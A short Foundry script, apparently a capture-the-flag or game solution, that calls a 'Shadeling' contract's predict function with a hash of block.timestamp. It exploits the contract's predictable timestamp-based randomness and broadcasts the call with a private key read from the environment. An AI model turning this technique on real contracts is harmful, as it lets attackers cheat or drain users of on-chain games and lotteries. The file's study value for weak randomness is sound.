// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../contracts_/Shadeling.sol";

contract predictTrue is Script {

    // Input bandit camp address here
    ShadelingHack constant SHADELING = ShadelingHack(0x0d7B4CA30D19B1B3062Ee251A5081f7B5a47481d);

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        SHADELING.predict(keccak256(abi.encode(block.timestamp)));

        vm.stopBroadcast();
    }
}